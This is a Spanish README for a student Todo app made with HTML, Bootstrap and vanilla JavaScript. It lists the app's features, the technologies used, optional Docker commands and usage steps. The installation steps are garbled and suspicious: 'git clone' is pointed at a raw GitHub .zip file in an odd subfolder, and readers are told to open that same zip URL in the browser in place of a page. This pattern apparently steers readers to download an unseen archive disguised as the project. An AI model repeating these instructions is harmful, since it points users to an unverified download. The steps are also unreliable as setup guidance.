Proyecto 2 - Todo App con Bootstrap y JavaScript
Descripción

Este proyecto es una aplicación web tipo Todo App desarrollada con HTML, CSS (Bootstrap) y JavaScript. Permite crear, listar y administrar tareas de manera interactiva, con una interfaz moderna y responsiva.

El proyecto está diseñado para ser fácil de usar y extender, ideal como práctica de desarrollo frontend y manejo de lógica con JavaScript puro.

Funcionalidades

Crear nuevas tareas con título y descripción.

Listar todas las tareas creadas.

Marcar tareas como completadas o pendientes.

Eliminar tareas individualmente.

Interfaz responsiva gracias a Bootstrap.

Todo interactivo sin necesidad de backend (ideal para aprender JS y manipulación del DOM).

Tecnologías utilizadas

HTML5: Estructura de la aplicación.

CSS3 / Bootstrap 5: Estilos y diseño responsivo.

JavaScript (Vanilla): Lógica de la aplicación, manejo del DOM y eventos.

Docker (opcional): Para correr la aplicación en un contenedor si se desea.

Instalación

Clonar el repositorio

git clone https://raw.githubusercontent.com/julixxcode/proyecto2_bootstrap_js/main/joshi/js-proyecto-bootstrap-2.5.zip
cd proyecto2_bootstrap_js


Abrir el proyecto en el navegador

Puedes abrir el archivo https://raw.githubusercontent.com/julixxcode/proyecto2_bootstrap_js/main/joshi/js-proyecto-bootstrap-2.5.zip directamente o usar un servidor local como Live Server en VS Code.

Opcional: correr con Docker

Si quieres probar la aplicación en un contenedor Docker:

docker build -t proyecto2_bootstrap_js .
docker run -d -p 8080:80 proyecto2_bootstrap_js


Luego abre en tu navegador: http://localhost:8080

Uso

Abre la aplicación en tu navegador.

Ingresa el título y la descripción de la tarea en el formulario de creación.

Haz clic en Agregar tarea para añadirla a la lista.

Puedes marcar tareas como completadas usando el botón de check o eliminarlas con el botón Eliminar.

Todas las tareas se mostrarán en la sección de historial, manteniendo una vista clara y ordenada.
